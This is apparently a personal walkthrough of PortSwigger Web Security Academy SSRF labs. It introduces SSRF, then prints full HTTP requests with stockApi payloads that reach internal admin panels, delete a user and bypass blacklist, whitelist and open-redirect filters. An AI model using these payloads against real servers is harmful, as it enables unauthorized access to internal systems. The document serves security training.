# SSRF (Server Side Request Forgery)

## Introduction
SSRF (Server Side Request Forgery) is a type of vulnerability that allows an attacker to force the server to make a request to different resources. These resources can include internal and external systems therefore you can potentially access information that should not usually be made available (internal) or make requests to external resources while making it look like it came from the vulnerable server.

## Blind SSRF

One type of SSRF is blind SSRF which is where you can make requests via the vulnerable server but their is no response returned back to the attacker on the front-end. One of the main methods of exploiting this is by using out of band techniques. Out of band techniques require the attacker to confirm the vulnerability by sending requests to a server they control.


## Lab: Basic SSRF against the local server

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. 


```
POST /product/stock HTTP/1.1
Host: 0aef00a0047ce0a8c2f5704e00f10006.web-security-academy.net
Cookie: session=SQEfYWjhobfDGJYOf1aEhPh7fyxhAeWY
Content-Length: 37
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0aef00a0047ce0a8c2f5704e00f10006.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aef00a0047ce0a8c2f5704e00f10006.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

stockApi=http%3a%2f%2flocalhost/admin

```


```
...
<div>
<span>carlos - </span>
<a href="/admin/delete?username=carlos">Delete</a>
</div>
...
```


```

POST /product/stock HTTP/1.1
Host: 0aef00a0047ce0a8c2f5704e00f10006.web-security-academy.net
Cookie: session=SQEfYWjhobfDGJYOf1aEhPh7fyxhAeWY
Content-Length: 60
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0aef00a0047ce0a8c2f5704e00f10006.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aef00a0047ce0a8c2f5704e00f10006.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

stockApi=http%3a%2f%2flocalhost/admin/delete?username=carlos

```


## Lab: Basic SSRF against another back-end system

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. 


```

POST /product/stock HTTP/1.1
Host: 0a0c001f03a490dfc01295e700430086.web-security-academy.net
Cookie: session=v3JgTz6xCD4gKIzVbTQ7jCJQsrouiP9g
Content-Length: 96
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a0c001f03a490dfc01295e700430086.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a0c001f03a490dfc01295e700430086.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=3


```

In this challenge as I don't know the exact IP I used Burp intruder in order to brute force the specific address sorting by status to easily find the correct address.


```
POST /product/stock HTTP/1.1
Host: 0a0c001f03a490dfc01295e700430086.web-security-academy.net
Cookie: session=v3JgTz6xCD4gKIzVbTQ7jCJQsrouiP9g
Content-Length: 62
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a0c001f03a490dfc01295e700430086.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a0c001f03a490dfc01295e700430086.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

stockApi=http://192.168.0.55:8080/admin/delete?username=carlos


```


## Lab: SSRF with blacklist-based input filter

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass. 



```
POST /product/stock HTTP/1.1
Host: 0aba009503123003c08dfe0d005c0085.web-security-academy.net
Cookie: session=PdyxyxPKEbH2LzDem6Ct2ihpkjiBB1Qr
Content-Length: 70
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0aba009503123003c08dfe0d005c0085.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aba009503123003c08dfe0d005c0085.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

stockApi=http://127.1/%2561%2564%256d%2569%256e/delete?username=carlos

```

Above I used the shorthand for 127.0.0.1 and double urlencoded the admin page as both "admin" and "127.0.0.1/localhost" were blacklisted.


## Lab: SSRF with whitelist-based input filter

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass. 

When modifying the request to try localhost I get the following response which indicates there may be some form of whitelisting:

```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 58

"External stock check host must be stock.weliketoshop.net"
```

Playing around I found that the `@` symbol is accepted and produces the default stock results and adding a double url-encoded `#` produces a `not found` page.

However putting adding the `/admin` still produces an error but when changing the default path at the end instead of putting it after localhost you can gain access to `admin`.

Annoyingly I wasn't able to do this one without looking at the solution.

```

POST /product/stock HTTP/1.1
Host: 0adb001e049ecbbfc06fb3a400140096.web-security-academy.net
Cookie: session=gAU1wypL4SqH3R6hadpbuUv4unB8qSzM
Content-Length: 64
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0adb001e049ecbbfc06fb3a400140096.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0adb001e049ecbbfc06fb3a400140096.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

stockApi=http://localhost%2523@stock.weliketoshop.net:8080/admin

```

## Lab: SSRF with filter bypass via open redirection vulnerability


This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first. 


```
POST /product/stock HTTP/1.1
Host: 0ad400fc031f5bf5c095c742008b00b5.web-security-academy.net
Cookie: session=86o79aI6P2DALwY2Gd33xdzEaXiFD9Ga; session=1tbyFqG1vHQo3RajHx16QLgtVSF0ObTq
Content-Length: 56
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0ad400fc031f5bf5c095c742008b00b5.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ad400fc031f5bf5c095c742008b00b5.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

stockApi=@192.168.0.12:8080/admin/delete?username=carlos


```

